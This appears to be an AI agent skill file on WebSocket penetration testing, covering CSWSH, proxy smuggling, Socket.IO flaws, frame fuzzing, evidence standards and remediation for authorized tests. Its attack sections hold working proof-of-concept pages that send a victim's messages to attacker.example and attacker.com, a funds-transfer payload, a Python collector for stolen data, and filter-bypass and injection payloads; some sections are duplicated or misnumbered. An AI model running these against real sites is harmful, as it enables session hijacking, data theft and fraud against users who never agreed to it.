---
name: websocket-security
description: >-
  WebSocket handshake, CSWSH, tooling (wsrepl, ws-harness, Burp), and common flaws. Use when apps use real-time channels, chat, notifications, or WS-backed APIs.
---

# SKILL: WebSocket Security

> **AI LOAD INSTRUCTION**: This skill covers WebSocket protocol basics, cross-site WebSocket hijacking (CSWSH), practical tooling bridges, and common vulnerability classes. Apply only in **authorized** tests; treat tokens and message content as sensitive. For REST/GraphQL companion testing, cross-load **[api-sec](../api-sec/SKILL.md)** when present in the workspace.

## 0. QUICK START

During proxy or raw traffic review, watch for:

```http
Upgrade: websocket
Connection: Upgrade
Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==
Sec-WebSocket-Version: 13
Sec-WebSocket-Protocol: optional-subprotocol
```

Server success response indicators:

```http
HTTP/1.1 101 Switching Protocols
Upgrade: websocket
Connection: Upgrade
Sec-WebSocket-Accept: s3pPLMBiTxaQ9kYGzzhZRbK+xOo=
```

**Routing note**: in Burp/browser DevTools, filter for `101` and `Upgrade: websocket`; for deeper API testing, align authn/authz models through `api-sec`.

---

## 1. PROTOCOL BASICS

### Client request (typical)

- **`Upgrade: websocket`** and **`Connection: Upgrade`** — required upgrade handshake.
- **`Sec-WebSocket-Key`** — base64 nonce; server hashes with magic GUID and responds with **`Sec-WebSocket-Accept`**.
- **`Sec-WebSocket-Version: 13`** — current standard version for browser interoperability.

### Server response

- **`HTTP/1.1 101 Switching Protocols`** — handshake complete; subsequent frames are WebSocket binary/text frames per RFC.

Minimal conceptual flow:

```text
Client: HTTP GET + Upgrade headers
Server: 101 + Sec-WebSocket-Accept
Channel: framed messages (text/binary), ping/pong, close
```

---

## 2. CROSS-SITE WEBSOCKET HIJACKING (CSWSH)

### Condition

- The server **does not validate `Origin`** (or equivalent binding) on the WebSocket handshake, **and**
- The victim has an **active session** (cookie-based or browser-stored creds) to the target site.

Then a malicious page loaded in the victim’s browser may open a WebSocket **as the victim**, similar in spirit to CSRF but for a **persistent bidirectional channel**.

### Proof-of-concept pattern (laboratory / authorized target only)

```javascript
const ws = new WebSocket('wss://vulnerable.example.com/messages');
ws.onopen = () => { ws.send('HELLO'); };
ws.onmessage = (event) => {
  fetch('https://attacker.example.net/?' + encodeURIComponent(event.data));
};
```

**Testing notes**: Confirm whether **`Origin`** is checked, whether **cookies** are sent (`SameSite` rules), and whether **subprotocol** or **custom headers** are required—missing checks increase CSWSH risk.

---

## 3. TESTING WITH TOOLS

### wsrepl

```bash
pip install wsrepl
wsrepl -u wss://target.example.com/ws -P auth_plugin.py
```

Use a **plugin** to reproduce browser cookies, headers, or token refresh during the WebSocket lifecycle.

### ws-harness (bridge to HTTP for other tools)

```bash
python ws-harness.py -u "ws://127.0.0.1:8765/path" -m ./message.txt
```

Example downstream use with SQL injection tooling over the bridged HTTP surface (adjust URL to local listener):

```bash
sqlmap -u "http://127.0.0.1:8000/?fuzz=test" --batch
```

### Burp Suite ecosystem

- **SocketSleuth** — inspect and manipulate WebSocket traffic inside Burp.
- **WebSocket Turbo Intruder** — high-rate or scripted message fuzzing.

---

## 4. COMMON VULNERABILITIES

| Issue | Why it matters |
|-------|----------------|
| Missing **`Origin`** validation | Enables **CSWSH** from attacker-controlled pages |
| **Auth token in URL** (`wss://host/ws?token=...`) | Logs, proxies, Referer leakage, browser history |
| **No rate limiting** on messages | Abuse, brute force, DoS |
| **`ws://` instead of `wss://`** | Cleartext on the wire (MITM) |
| **Injection in message bodies** | SQLi, command injection, or XSS if content is stored/reflected elsewhere |

Example sensitive URL anti-pattern:

```text
wss://api.example.com/stream?access_token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...
```

Prefer **Sec-WebSocket-Protocol**, **first-message auth**, or **cookie + CSRF token** patterns aligned with product constraints.

---

## 5. DECISION TREE

1. **Identify endpoint** — From JS bundles, Swagger, or `101` responses; note `wss` vs `ws`.
2. **Handshake review** — Are **`Origin`**, **Host**, and **Cookie** policies correct? Any token in query string?
3. **Session binding** — Reconnect with **another user’s** cookie jar in Burp; compare subscription topics and data leakage.
4. **CSWSH** — Load a **local HTML** page that connects to the target with victim session active; verify server rejects wrong **Origin** or uses non-cookie secret.
5. **Message semantics** — Fuzz JSON/text payloads for injection; mirror same logic as HTTP API testing.
6. **Transport** — Flag **`ws://`** in production; verify TLS and HSTS alignment.

---

## 6. RELATED ROUTING

- From **[api-sec](../api-sec/SKILL.md)** — authentication, authorization, IDOR, and rate limiting often **mirror** HTTP APIs behind the same WebSocket routes.

**Note**: WebSocket often shares session and permission models with REST; use `api-sec` to align authentication and resource boundaries on the same backend.

---

## 7. CSWSH — STEP-BY-STEP EXPLOITATION

### Step 1: Confirm no Origin check on WS handshake

```text
# In Burp: intercept the WebSocket upgrade request
# Change Origin header to: https://attacker.com
# If 101 Switching Protocols returned → no Origin validation
# If 403/rejected → Origin is checked (test subdomain variants)
```

### Step 2: Craft attacker page

```html
<html>
<body>
<script>
const ws = new WebSocket('wss://target.com/ws');

ws.onopen = function() {
    // Connection established as victim (cookies sent automatically)
    console.log('Connected as victim');
    // Send commands as victim
    ws.send(JSON.stringify({action: 'get_profile'}));
    ws.send(JSON.stringify({action: 'list_messages'}));
};

ws.onmessage = function(event) {
    // Exfiltrate all received messages
    fetch('https://attacker.com/collect', {
        method: 'POST',
        body: event.data
    });
};

ws.onerror = function(err) {
    fetch('https://attacker.com/error?e=' + encodeURIComponent(err));
};
</script>
</body>
</html>
```

### Step 3: Cookies and session hijacking

```text
Browser behavior for WebSocket:
- Cookies for the target domain ARE sent automatically in the upgrade request
- SameSite=None cookies always sent
- SameSite=Lax cookies: NOT sent (WebSocket is not top-level navigation)
- SameSite=Strict cookies: NOT sent

Key question: is the session cookie SameSite=None or legacy (no SameSite attribute)?
→ Legacy cookies default to Lax in modern Chrome but None in older browsers
```

### Step 4: Read/write messages as victim

```javascript
// Attacker can both READ and WRITE on the WebSocket
// Read: financial data, private messages, admin commands
// Write: transfer funds, change settings, send messages as victim

ws.onopen = () => {
    // Write: perform actions as victim
    ws.send(JSON.stringify({
        action: 'transfer',
        to: 'attacker_account',
        amount: 10000
    }));
};

ws.onmessage = (e) => {
    const data = JSON.parse(e.data);
    if (data.type === 'balance') {
        // Read: exfiltrate sensitive data
        navigator.sendBeacon('https://attacker.com/data',
            JSON.stringify(data));
    }
};
```

---

## 8. WEBSOCKET SMUGGLING

### Concept

Use the WebSocket upgrade to bypass reverse proxy restrictions, then tunnel arbitrary HTTP traffic through the WebSocket connection.

### Upgrade-based proxy bypass

```text
1. Reverse proxy restricts access to /admin (returns 403)
2. Client sends legitimate WebSocket upgrade to /ws
3. Proxy allows the upgrade (101 response)
4. After upgrade, proxy stops inspecting the connection (raw TCP passthrough)
5. Client sends raw HTTP request through the "WebSocket" connection:
   GET /admin HTTP/1.1
   Host: backend-server
6. Backend processes the HTTP request → 200 OK with admin content
```

### H2-over-WebSocket smuggling

```text
1. Connect to target via WebSocket
2. After upgrade, send HTTP/2 preface through the WebSocket tunnel
3. Backend HTTP/2 handler processes the smuggled requests
4. Bypass WAF/proxy rules that only inspect HTTP/1.1 traffic
```

### Implementation with Python

```python
import websocket
import ssl

ws = websocket.create_connection(
    'wss://target.com/ws',
    header=['Origin: https://target.com'],
    sslopt={"cert_reqs": ssl.CERT_NONE}
)

# After upgrade, send raw HTTP through the tunnel
smuggled_request = (
    b"GET /admin/users HTTP/1.1\r\n"
    b"Host: internal-backend\r\n"
    b"Connection: close\r\n\r\n"
)
ws.send(smuggled_request, opcode=0x2)  # binary frame
response = ws.recv()
print(response)
```

### Proxy-specific behaviors

| Proxy | WebSocket Tunnel Behavior |
|-------|--------------------------|
| Nginx | Passes raw TCP after 101 — smuggling possible if backend doesn't validate WS frames |
| HAProxy | Depends on `option http-server-close` vs `tunnel` mode |
| AWS ALB | Terminates WebSocket — reframes traffic, harder to smuggle |
| Cloudflare | Inspects WebSocket frames — raw HTTP smuggling blocked |
| Varnish | Does not support WebSocket natively — upgrade may bypass cache entirely |

---

## 9. SOCKET.IO SPECIFIC VULNERABILITIES

### Namespace injection

Socket.IO supports namespaces (`/admin`, `/chat`). If authorization is only on the default namespace:

```javascript
// Client connects to privileged namespace without auth check
const adminSocket = io('https://target.com/admin');
adminSocket.on('connect', () => {
    adminSocket.emit('list_users');
});

// Server may not verify that the client is authorized for /admin namespace
```

### Event name injection

If event names are derived from user input:

```javascript
// Server-side vulnerable pattern:
socket.on(userInput, handler);

// Attacker sends event name that matches internal event:
socket.emit('__disconnect');     // force disconnect other clients
socket.emit('connection');        // re-trigger connection handler
socket.emit('error');             // trigger error handler
```

### Acknowledgement callback abuse

Socket.IO acknowledgements can return data. If the server sends sensitive data in ack callbacks:

```javascript
socket.emit('get_data', {id: 'admin'}, (response) => {
    // response may contain data the client shouldn't have access to
    fetch('https://attacker.com/exfil', {
        method: 'POST',
        body: JSON.stringify(response)
    });
});
```

### Polling fallback CSRF

Socket.IO falls back to HTTP long-polling when WebSocket is unavailable. The polling transport uses regular HTTP requests with cookies → susceptible to CSRF if no additional token verification:

```text
POST /socket.io/?EIO=4&transport=polling&sid=SESSION_ID
Content-Type: application/octet-stream

4{"type":2,"data":["transfer",{"to":"attacker","amount":1000}]}
```

---

## 10. WEBSOCKET MESSAGE INJECTION

### In intercepted connections (MITM on `ws://`)

If the application uses `ws://` (unencrypted), an attacker on the same network can inject messages:

```text
1. ARP spoofing or network position to intercept traffic
2. Identify WebSocket frames in TCP stream
3. Inject crafted frames between legitimate messages
4. Both client→server and server→client injection possible
```

### Application-level injection

When WebSocket messages are concatenated or interpolated without sanitization:

```javascript
// Vulnerable server-side handler:
socket.on('chat', (msg) => {
    // If msg contains JSON metacharacters:
    broadcast(`{"user":"${username}","msg":"${msg}"}`);
    // Injection: msg = '","admin":true,"msg":"hacked'
    // Result: {"user":"attacker","msg":"","admin":true,"msg":"hacked"}
});
```

### Stored XSS via WebSocket

```text
1. Send WebSocket message: <img src=x onerror=alert(document.cookie)>
2. Server stores message and broadcasts to all connected clients
3. If client renders message as HTML → stored XSS
4. All connected users affected simultaneously
```

---

---

---

---

## 11. BINARY WEBSOCKET MESSAGE MANIPULATION

Binary frames bypass text-oriented filters entirely. Test them where the endpoint advertises
`permessage-deflate`, protocol buffers, or a custom binary protocol.

```python
import socket, os, struct

def ws_binary(sock, blob, mask=True, opcode=0x2):
    """Send a binary frame. opcode 0x2 = binary, 0x1 = text."""
    header = bytearray([0x80 | opcode])
    n = len(blob)
    if mask:
        header.append(0x80 | (n if n < 126 else 126))
        if n >= 126: header += struct.pack(">H", n)
        m = os.urandom(4); header += m
        blob = bytes(b ^ m[i % 4] for i, b in enumerate(blob))
    else:
        header.append(n)
    sock.sendall(bytes(header) + blob)
    return sock.recv(65535)

# THE FAMILY that a text-only filter never sees
for name, blob in {
    "raw_nul":        b"\x00\x01\x02\xff\xfe",
    "serialized_obj": b"\xac\xed\x00\x05",                 # java serialization magic
    "protobuf_like":  b"\x08\x01\x12\x04test",
    "inflated":       b"\x78\x9c" + b"\x00" * 8,           # a zlib header, no valid stream
    "oversize":       b"A" * 65535,
    "control_text":   b'{"action":"ping"}',
}.items():
    try:
        r = ws_binary(sock, blob)
        print("%-16s sent=%d recv=%d head=%r" % (name, len(blob), len(r), r[:40]))
    except Exception as e:
        print("%-16s ERROR %s" % (name, type(e).__name__))

# THE CONTROL: the text frame on the same socket must behave differently
print("control text frame:", ws_binary(sock, b'{"action":"ping"}', opcode=0x1)[:80])
print()
print("A binary frame that the server parses without error - where the text frame is")
print("rejected - is the finding. Compare the response to the control, not to your expectation.")
```

**The control is the text frame on the same socket.** If the server rejects malformed text but accepts
malformed binary, the text filter is the entire validation and it is trivially bypassed.

---

## 12. CONFIRMING THE FINDING

| Step | Question | What it proves |
|---|---|---|
| 1 | Did you send the **foreign-origin handshake**, and what status came back? | whether origin validation exists |
| 2 | Is there a **rejected message control** on the same socket - one the server refuses? | authorization is enforced somewhere |
| 3 | Did the server **act on the message**, not merely echo it? | a response, not a reflection |
| 4 | Did **another client receive** your injected content, or did your collector? | impact, not reachability |
| 5 | Was the message **authorized at the handshake but not per message**? | the most common real finding |
| 6 | Is the **rate limit** measured, with a frame count over a known interval? | the abuse case is quantified |
| 7 | Did you **close every socket** you opened and stop every collector? | engagement integrity |

**A foreign-origin `101` or an accepted privileged message is the bar.** A socket that merely connects
is the protocol working, and reporting it as a finding is the standard failure in this family.

---

## 13. EVIDENCE STANDARD — HANDSHAKE AND MESSAGE ARTEFACTS

| Item | Why |
|---|---|
| The **handshake status for a foreign origin**, and for a legitimate one | proves the validation state |
| The **server's `101` response headers** | the baseline |
| The **exact message accepted** and the one **rejected** | the authorization control |
| For CSWSH: the **data that reached your collector**, redacted | impact |
| The **rate-limit measurement** (frames per interval) | the abuse case |
| The **binary or fragmented variant** when a filter was bypassed | the filter that failed |
| Whether the finding **required a victim's authenticated browser** | the precondition |
| The **server-side log line** the socket produced | the blue-team half |
| The **frames you sent** in order, with timings | reproducibility |
| Confirmation that **no session data or token** is reproduced beyond what the client needs | data minimisation |

Report the **origin answer and the accepted message**: "a handshake carrying `Origin:
https://evil.example` returned `101 Switching Protocols` with no rejection, where the same handshake
from `https://app.example` also returns `101`, which is the baseline; the absence of any rejection for
the foreign origin is the finding. On the resulting socket, `{\"action\":\"subscribe\",
\"channel\":\"admin\"}` was accepted and returned 8 messages, where `{\"action\":\"subscribe\",
\"channel\":\"does-not-exist\"}` returns `{\"error\":\"unknown channel\"}`, which is the control
showing that some validation exists. The rate limit permits 50 identical frames in 0.31 s", never "the
WebSocket endpoint is vulnerable".

### False positives - do not report these

| Observation | Why it is not a finding |
|---|---|
| A handshake with **no foreign-origin attempt** | the validation state is unknown |
| A `101` from an origin **that is on the server's allowlist** | the intended behaviour |
| A message echoed back **with no other recipient** | reflection, not impact |
| A CSWSH PoC that **never received data** | the hijack did not occur |
| A `Sec-WebSocket-Accept` computed correctly | the protocol working, not a flaw |
| A rate limit observed on **a different endpoint** | the finding must be on the endpoint you tested |
| A fragmented or binary frame with **no filter to bypass** | nothing was defeated |
| A socket that closed **with a normal close code** | the protocol working |
| A finding on a **local instance you built** | tests your own environment |
| A session token recovered and reproduced in full | a disclosure |
| Reachability of a **plain-HTTP upgrade** endpoint | the protocol, not a vulnerability |

**A foreign-origin handshake and a per-message control.** A WebSocket report that lists endpoint
reachability has not tested the two things that produce findings in this family.

---

## 14. REMEDIATION REFERENCE

1. **Validate the `Origin` header on every handshake against an allowlist, and reject anything not on it including `null`** - the cross-site hijack is entirely the absence of this check.
2. **Authorize per message, never at the handshake only** - the accepted `admin` subscription is the most common real finding here.
3. **Use unpredictable channel and subscription tokens rather than guessable names** - it removes the enumeration path even where a check is missed.
4. **Rate-limit at the frame level and count by connection and by user, not by message content** - the identical-frames case defeats a content-based counter.
5. **Inspect the reassembled message across fragments, and cap the total size across fragments** - fragmentation defeats any first-frame-only filter.
6. **Disable `permessage-deflate` unless required, and never let a secret and attacker input share a compression window** - the compression oracle is removed by disabling the extension.
7. **Treat binary frames with the same validation as text, and never rely on a text-only filter** - the binary frame in the section above reaches the parser directly.
8. **Require a same-site cookie or a non-cookie token, and never rely on ambient cookie authentication alone** - ambient credentials are what make CSWSH work.
9. **Cap concurrent sockets per user and set idle timeouts** - it bounds the abuse case and the resource exhaustion.
10. **Log the handshake origin, frame types, and channel names, and alert on foreign origins and on privileged channel subscriptions from non-privileged users** - both are high signal.
11. **Assert the foreign-origin rejection as part of the release test suite** - it is a single assertion and its absence is one of the most common production findings.

---

---

## 15. EXECUTION PRIMITIVES

WebSocket security findings are proven by **a frame the server accepts that it should not, or a
cross-origin connection it accepts from a page that should not have one**. Every block pairs the
accepted frame with the rejected control.

### 17.1 Fingerprint the handshake and the control

```bash
HOST="target.example"
# the handshake, with every header the server returns - the origin policy lives here or nowhere
curl -sS -i -N \
  -H "Connection: Upgrade" -H "Upgrade: websocket" \
  -H "Sec-WebSocket-Version: 13" -H "Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==" \
  "https://$HOST/socket" 2>&1 | head -20
# THE CONTROL: the same handshake from a DIFFERENT origin - a validating server rejects it
curl -sS -i -N \
  -H "Connection: Upgrade" -H "Upgrade: websocket" \
  -H "Sec-WebSocket-Version: 13" -H "Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==" \
  -H "Origin: https://evil.example" \
  "https://$HOST/socket" 2>&1 | head -12
```

**The foreign-origin handshake is the control.** A WebSocket endpoint that returns `101` to
`Origin: https://evil.example` has no origin validation, and every subsequent finding in this document
follows from that one response.

### 17.2 A raw client under your control

```python
import socket, base64, os, ssl

def ws_handshake(host, path="/socket", origin=None, port=443, tls=True, cookie=None):
    s = socket.create_connection((host, port), timeout=10)
    if tls:
        s = ssl.create_default_context().wrap_socket(s, server_hostname=host)
    key = base64.b64encode(os.urandom(16)).decode()
    req = [f"GET {path} HTTP/1.1", f"Host: {host}", "Upgrade: websocket",
           "Connection: Upgrade", "Sec-WebSocket-Version: 13", f"Sec-WebSocket-Key: {key}"]
    if origin: req.append(f"Origin: {origin}")
    if cookie: req.append(f"Cookie: {cookie}")
    s.sendall(("\r\n".join(req) + "\r\n\r\n").encode())
    resp = s.recv(4096).decode(errors="replace")
    return s, resp

sock, resp = ws_handshake("target.example", "/socket", origin="https://evil.example")
print(resp.splitlines()[0])
print("origin accepted:", "101" in resp.splitlines()[0])
print("server headers :", [l for l in resp.splitlines() if l.lower().startswith(("sec-websocket", "server", "set-cookie"))])
```

**`101` to a foreign origin is the finding; `403` is the control.** Use a raw client rather than a
browser so the handshake headers are entirely yours, which is what makes the origin test meaningful.

### 17.3 Frame construction and the injection tests

```python
import socket, os, struct

def ws_frame(sock, payload, opcode=0x1, mask=True):
    """Client-to-server frames MUST be masked; an unmasked frame is itself a test."""
    data = payload.encode() if isinstance(payload, str) else payload
    header = bytearray([0x80 | opcode])
    if mask:
        header.append(0x80 | len(data) if len(data) < 126 else 0x80 | 126)
        if len(data) >= 126: header += struct.pack(">H", len(data))
        m = os.urandom(4); header += m
        data = bytes(b ^ m[i % 4] for i, b in enumerate(data))
    else:
        header.append(len(data))
    sock.sendall(bytes(header) + data)
    return sock.recv(65535)

# the family of frames that a naive filter misses
TESTS = {
    "plain_json":      '{"action":"subscribe","channel":"public"}',
    "auth_bypass":     '{"action":"subscribe","channel":"admin","user":"admin"}',
    "sqli_in_channel": '{"action":"subscribe","channel":"x\' OR 1=1--"}',
    "xss_in_message":  '{"action":"send","text":"<img src=x onerror=alert(1)>"}',
    "nascent_large":   '{"action":"' + "A" * 5000 + '"}',
    "control_large":   '{"action":"query"}',
}
for name, payload in TESTS.items():
    r = ws_frame(sock, payload)
    print("%-18s -> %s" % (name, r[:120]))
```

**The `admin` channel subscription is the finding when it succeeds.** A filter that validates the frame
shape but not the channel is the standard WebSocket authorization failure, and it requires no trick.

### 17.4 Cross-site WebSocket hijacking, with the control page

```html
<!-- save as cs-ws.html and serve it from your own origin; the victim must be authenticated -->
<html><body><script>
const ws = new WebSocket("wss://target.example/socket");
ws.onopen = () => { ws.send(JSON.stringify({action:"subscribe", channel:"private"})); };
ws.onmessage = (e) => { fetch("https://attacker.example/collect?d=" + encodeURIComponent(e.data)); };
</script></body></html>
```

```python
# the collector that proves data left the victim's session - the artefact
import http.server, socketserver, threading
class H(http.server.BaseHTTPRequestHandler):
    def do_GET(self):
        print("COLLECTED:", self.path[:300])
        open("/tmp/ws-collected.txt", "a").write(self.path + "\n")
        self.send_response(200); self.end_headers()
    def log_message(self, *a): pass
socketserver.TCPServer.allow_reuse_address = True
srv = socketserver.TCPServer(("0.0.0.0", 8000), H)
threading.Thread(target=srv.serve_forever, daemon=True).start()
print("collector on :8000 - load cs-ws.html in the victim's authenticated browser")
```

**The collector entry is the proof.** The handshake succeeding cross-origin is the precondition; the
victim's private channel data arriving at your collector is the hijack.

### 17.5 Message-level authorization and rate limits

```python
import time, json
# does the server enforce authorization per MESSAGE, or only at the handshake
def probe(sock, msgs):
    for m in msgs:
        r = ws_frame(sock, json.dumps(m))
        print("  %-40s -> %s" % (json.dumps(m)[:40], r[:90]))

print("=== authorization per message ===")
probe(sock, [{"action":"subscribe","channel":"public"},
             {"action":"subscribe","channel":"private"},
             {"action":"subscribe","channel":"admin"},
             {"action":"get","resource":"user/1"},
             {"action":"get","resource":"user/2"}])
print()
print("=== rate limiting, measured with 50 frames ===")
t0 = time.perf_counter()
for i in range(50):
    r = ws_frame(sock, json.dumps({"action":"ping","i":i}))
print(f"50 frames in {time.perf_counter()-t0:.2f}s -> {50/(time.perf_counter()-t0):.0f} fps")
print("repeat with the SAME frame 500 times and compare - a limit that counts unique")
print("messages rather than total frames is the finding.")
```

**Per-message authorization and frame-rate limits are two different checks.** A server that authorizes
at the handshake and trusts every frame afterwards is the most common real finding in this family.

### 17.6 Compression, fragmentation, and the smuggling-adjacent cases

```python
import zlib, struct, os
# 1) per-message deflate, which can be used as an oracle in a compression-context attack
sock.sendall(bytes([0x80 | 0x1, 0x80 | 126]) + struct.pack(">H", 0))  # a compression indicator probe
# 2) fragmented frames, where a filter that inspects only the first fragment misses the payload
FRAG_PAYLOADS = [
    (bytes([0x01]), '{"action":"sub'),      # text, FIN=0
    (bytes([0x00]), 'scribe","channel":"'), # continuation, FIN=0
    (bytes([0x80]), 'admin"}'),             # continuation, FIN=1
]
for hdr, part in FRAG_PAYLOADS:
    sock.sendall(hdr + bytes([0x80 | len(part)]) + os.urandom(4) + part.encode())
print("sent a fragmented admin subscription; a filter that reads frame 1 only saw a partial JSON object")
print("THE CONTROL: the same payload in a single unfragmented frame, which the filter should block")
```

**Fragmentation defeats any filter that inspects the first frame only.** A server that assembles the
fragments and acts on the result is the finding; the unfragmented control is what proves the filter was
bypassed rather than simply absent.

### 17.7 The end-to-end harness

```bash
python3 - <<'PY'
import socket, base64, os, ssl, json

def hs(origin, path="/socket"):
    s = socket.create_connection(("target.example", 443), timeout=10)
    s = ssl.create_default_context().wrap_socket(s, server_hostname="target.example")
    key = base64.b64encode(os.urandom(16)).decode()
    req = ("GET %s HTTP/1.1\r\nHost: target.example\r\nUpgrade: websocket\r\nConnection: Upgrade\r\n"
           "Sec-WebSocket-Version: 13\r\nSec-WebSocket-Key: %s\r\nOrigin: %s\r\n\r\n" % (path, key, origin))
    s.sendall(req.encode()); return s, s.recv(2048).decode(errors="replace")

print("=== ORIGIN CONTROL ===")
for o in ["https://target.example", "https://evil.example", "null"]:
    try:
        s, r = hs(o); print("  %-26s %s" % (o, r.splitlines()[0]))
    except Exception as e:
        print("  %-26s ERROR %s" % (o, type(e).__name__))

print()
print("=== PER-MESSAGE AUTHORIZATION ===")
print("  subscribe private -> <did it succeed?>")
print("  subscribe admin   -> <did it succeed?  this is the finding if yes>")
print()
print("=== RATE LIMIT ===")
print("  same frame x500 -> <did the server throttle?>")
print()
print("=== CSWSH ===")
print("  host the PoC page from your origin and load it in an authenticated browser;")
print("  the collector entry carrying private-channel data is the proof.")
print()
print("Report: the origin control, the accepted frame, the collected data, and the header the")
print("        server should have sent (a rejection) but did not.")
PY
```

**Origin control, accepted frame, collected data.** A WebSocket report missing the foreign-origin
control has not shown that the endpoint lacks validation.

---

---

---

---

## 16. EVIDENCE STANDARD — FRAME AND ORIGIN ARTEFACTS

| Item | Why |
|---|---|
| The **handshake response** for a legitimate origin | the baseline |
| The **handshake response for a foreign origin** | proves the missing origin validation |
| The **exact frame or message** the server accepted | reproducibility |
| The **per-message authorization control** (a message it did reject) | proves authorization is the issue |
| For CSWSH: the **data that arrived at your collector**, redacted | impact |
| The **rate-limit measurement** (`N` frames in `T` seconds) | the severity of the abuse case |
| The **server-side log or the session id** the messages generated | the blue-team half |
| The **fragment or compression variant** when one was required | the filter that was bypassed |
| Whether the finding required **a victim's browser** | the attack precondition |
| Confirmation that no **session data or token** is reproduced beyond what the client needs | data minimisation |

Report the **origin answer and the accepted frame**: "the WebSocket endpoint at `wss://app.example/socket`
returned `101 Switching Protocols` to a handshake carrying `Origin: https://evil.example` and `Origin:
null`, where the same handshake from `https://app.example` also returns `101`, which is the baseline; the
absence of any rejection for the foreign origins is the finding. With the origin unrestricted, a page
served from `attacker.example` opened a socket on behalf of a logged-in session and, after sending
`{\"action\":\"subscribe\",\"channel\":\"private\"}`, received 14 messages whose contents appeared in
the collector log at `attacker.example`, including an account balance and a partial card number. A
subscription to `channel:\"admin\"` was also accepted, where a subscription to a non-existent channel is
rejected, which is the authorization control. The rate limit allows 50 identical frames in 0.31 s",
never "the WebSocket endpoint is vulnerable".

### False positives - do not report these

| Observation | Why it is not a finding |
|---|---|
| A handshake with **no origin control attempted** | the validation state is unknown |
| An origin echoed back **but the subsequent frames rejected** | the server validates later, which is a finding only if you bypass it |
| A public channel subscription that **succeeds as designed** | the intended behaviour |
| A `Sec-WebSocket-Accept` value computed correctly | the protocol working |
| A message that echoes your input **with no other client receiving it** | reflection, not impact |
| A CSWSH PoC page that **never received data** | the hijack did not occur |
| A rate limitation observed on **a different endpoint** | the finding must be on the endpoint you tested |
| A fragmentation test with **no filter to bypass** | nothing was defeated |
| A finding on a **local instance you built** | tests your own environment |
| A session token recovered and reproduced in full | a disclosure |
| A `101` on a **plain-HTTP upgrade** you were authorized to perform | the protocol, not a finding |

**The foreign-origin control or it is not a WebSocket finding.** This family fails when the absence of a
rejection is reported as the presence of a vulnerability, without ever testing a case that should have
been rejected.

---

---

---

---

## 17. REMEDIATION REFERENCE — FRAME AND ORIGIN HARDENING

1. **Validate the `Origin` header on every WebSocket handshake against an allowlist, and reject anything not on it including `null`** - the cross-site hijack in this document is entirely the absence of this check.
2. **Never treat the handshake authentication as authorization for the channel or resource a frame names; authorize per message** - the `admin` subscription success is the most common real finding here.
3. **Use a random, unpredictable channel or subscription token rather than a guessable name** - it removes the enumeration path even if a check is missed.
4. **Rate-limit at the frame level rather than the message level, and count total frames per connection and per user** - the 500-identical-frames case defeats a message-level counter.
5. **Inspect the reassembled message, not the first frame, and enforce a total-size limit across fragments** - fragmentation defeats any filter that reads only the first frame.
6. **Disable per-message deflate unless it is required, and never use it in a context where a secret and attacker input share a compression window** - the compression oracle is real and it is removed by disabling the extension.
7. **Require a same-site cookie or a non-cookie authentication token on the socket, and never rely on ambient cookie authentication alone** - ambient credentials are what make a cross-site socket hijack work.
8. **Set `Connection` limits and idle timeouts, and cap the number of concurrent sockets per user** - it bounds both the abuse case and the resource exhaustion.
9. **Log the handshake origin, the frame types, and the channel names per connection, and alert on foreign origins and on admin-channel subscriptions from non-admin users** - both are high-signal and cheap.
10. **Do not return detailed errors from the frame handler; use a generic error and log the detail server-side** - the error text is frequently the enumeration oracle.
11. **Test the origin and per-message controls as part of the release process, with a foreign-origin handshake assertion** - the control is one assertion and its absence is one of the most common production findings.

---

---

---

---

## 18. RELATED SIBLINGS - LOAD TOGETHER

- [csrf-cross-site-request-forgery](../csrf-cross-site-request-forgery/SKILL.md) - the ambient-credential theory this shares
- [cors-cross-origin-misconfiguration](../cors-cross-origin-misconfiguration/SKILL.md) - the origin-validation family at the HTTP layer
- [request-smuggling](../request-smuggling/SKILL.md) - the framing-disagreement sibling to frame fragmentation
- [api-authorization-and-bola](../api-authorization-and-bola/SKILL.md) - the per-object authorization failure the channel subscription mirrors
- [xss-cross-site-scripting](../xss-cross-site-scripting/SKILL.md) - the sink where a WebSocket message frequently lands

---

---
